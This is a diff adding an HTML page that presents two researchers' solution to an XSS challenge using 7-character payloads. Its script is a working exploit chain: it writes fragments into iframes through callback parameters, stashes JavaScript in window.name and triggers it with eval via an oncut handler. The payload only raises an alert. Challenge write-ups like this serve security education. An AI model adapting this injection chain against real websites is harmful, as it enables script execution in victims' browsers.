@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>XSS Challenge 2020-06 | Solution</title>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/night-owl.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+    <link rel="preload" as="image" href="bg.jpg">
+    <link rel="stylesheet" href="style.css">
+    <script src="misc.js"></script>
+</head>
+
+<body>
+    <div id=intro class=window>
+        <span class=title>Intro</span>
+        <h1> Solution to <a target="_blank" href="https://vulnerabledoma.in/xss_2020-06/">XSS Challenge 2020-06</a>
+            using 7 characters only. </h1>
+        <p>
+
+            <h2 class=subtitle>By <a target="_blank" href="https://twitter.com/@lbherrera_">@lbherrera_</a>
+                and <a target="_blank" href="https://twitter.com/@terjanq">@terjanq</a> </h2>
+        </p>
+        <h2>The challenge</h2>
+        <details>
+            <summary>check_code.php</summary>
+            <pre><code class="language-php" id="codePHP"></code></pre>
+        </details>
+        <details>
+            <summary>index.html</summary>
+            <pre><code class="language-html" id="codeHTML"></code></pre>
+        </details>
+    </div>
+
+    <div class=window>
+        <span class=title>Proof of Concept</span>
+        <pre class=main><code id=code class="language-html"></code></pre>
+    </div>
+
+    <div id=solution>
+
+        <!-- IframeA -->
+        <iframe name="a" id="iframeA"></iframe>
+
+        <!-- IframeB -->
+        <iframe name="b" id="iframeB"></iframe>
+
+        <script>
+            const sleep = d => new Promise(r => setTimeout(r, d));
+
+            /* writes an iframe to DOM, then removes it */
+
+            const writeToIframe = async (payload, callback, preload = false) => {
+                return new Promise((resolve) => {
+                    console.log(payload.length);
+                    let iframe = document.createElement("iframe");
+                    
+                    /* 
+                     *  Resources inside iframe will not be cached, only the iframe itself. 
+                     *  With sandbox attribute, the browser will prevent loading of slowing down 
+                     *  resources inside the iframe.
+                     */
+
+                    if (preload) iframe.sandbox = "";
+                    iframe.src =
+                        `https://vulnerabledoma.in/xss_2020-06/?code=${payload}%26callback=${callback}`;
+                    iframe.onload = async () => {
+                        iframe.remove();
+                        resolve(true);
+                    }
+                    document.body.appendChild(iframe);
+                });
+            }
+
+            /* Preloades iframes so craftIframeA and craftIframeB will load faster */
+
+            const preloadIframes = async () => {
+
+                const promises = [
+                    writeToIframe(`<i x=`,   "top.a.document.write", true),
+                    writeToIframe(`oncut="`, "top.a.document.write", true),
+                    writeToIframe(`;x=top;`, "top.a.document.write", true),
+                    writeToIframe(`;x.b.x=`, "top.a.document.write", true),
+                    writeToIframe(`?x.a:`,   "top.a.document.write", true),
+                    writeToIframe(`">`,      "top.a.document.write", true),
+                    writeToIframe(`<i x=`,   "top.b.document.write", true),
+                    writeToIframe(`oncut="`, "top.b.document.write", true),
+                    writeToIframe(`;x=x./*`, "top.b.document.write", true),
+                    writeToIframe(`*/name;`, "top.b.document.write", true),
+                    writeToIframe(`;eval/*`, "top.b.document.write", true),
+                    writeToIframe(`*/(x)">`, "top.b.document.write", true),
+                    writeToIframe(`1337`, "top.a.document.body.firstElementChild.oncut", true),
+                    writeToIframe(`1337`, "top.b.document.body.firstElementChild.oncut", true),
+                    /* load initial iframes */
+                    new Promise(r => {
+                        iframeA.src = 'https://vulnerabledoma.in/xss_2020-06/check_code.php'
+                        iframeA.onload = r
+                    }),
+                    new Promise(r => {
+                        iframeB.src = 'https://vulnerabledoma.in/xss_2020-06/check_code.php'
+                        iframeB.onload = r;
+                    })
+                ]
+
+                return Promise.all(promises);
+            }
+
+            /* 
+             *  writes to IframeA the following payload to oncut event
+             *    top.b.x = top.a; // assign a reference to IframeA in IframeB.x
+             */
+
+            const craftIframeA = async () => {
+                await writeToIframe(`<i x=`,   "top.a.document.write");
+                await writeToIframe(`oncut="`, "top.a.document.write");
+                await writeToIframe(`;x=top;`, "top.a.document.write");
+                await writeToIframe(`;x.b.x=`, "top.a.document.write");
+                await writeToIframe(`?x.a:`,   "top.a.document.write");
+                await writeToIframe(`">`,      "top.a.document.write");
+
+                /* calls oncut events to imitate user interaction */
+                await writeToIframe(`1337`, "top.a.document.body.firstElementChild.oncut");
+
+                /*
+                 * Stores a payload
+                 *   onmessage=e=>alert(`Took me ${e.data} seconds`)
+                 * in name, sends information to top frame that pudim is read and then goes back
+                 * to the vulnerabledoma.in domain so IframeB can access the IframeA name
+                 */
+
+                iframeA.srcdoc = `<script>
+                                    window.name="onmessage=e=>alert(\`Took me \${e.data} seconds\`)";
+                                    top.postMessage('pudim', '*');
+                                    location='https://vulnerabledoma.in/xss_2020-06/check_code.php';
+                                <\/script>`;
+            }
+
+            /* 
+             *  writes to IframeB a following payload to oncut event
+             *    eval(x.name) // evaluates a string from IframeA.name
+             */
+
+            const craftIframeB = async () => {
+                await writeToIframe(`<i x=`,   "top.b.document.write");
+                await writeToIframe(`oncut="`, "top.b.document.write");
+                await writeToIframe(`;x=x./*`, "top.b.document.write");
+                await writeToIframe(`*/name;`, "top.b.document.write");
+                await writeToIframe(`;eval/*`, "top.b.document.write");
+                await writeToIframe(`*/(x)">`, "top.b.document.write");
+            }
+
+            let start = 0;
+
+            window.onmessage = async e => {
+                if (e.data === "pudim") {
+                    console.log("pudim");
+
+                    /* await for cross-origin */
+                    await new Promise(resolve => {
+                        let interval = setInterval(() => {
+                            try {
+                                iframeA.contentWindow.alert;
+                            } catch (e) {
+                                resolve(true);
+                                clearInterval(interval);
+                            }
+                        }, 1)
+                    });
+
+                    /* when iframeA is loaded, imitate oncut in IframeB */
+                    await writeToIframe(`1337`, "top.b.document.body.firstElementChild.oncut");
+                    await sleep(50);
+                    let time = ((performance.now() - start) / 1000).toFixed(2);
+                    b.postMessage(time, '*');
+                }
+            };
+
+            window.addEventListener(`load`, async _ => {
+                start = performance.now();
+                await preloadIframes();
+                craftIframeA();
+                craftIframeB();
+            });
+        </script>
+
+    </div>
+
+
+    
+</body>
+
+</html>
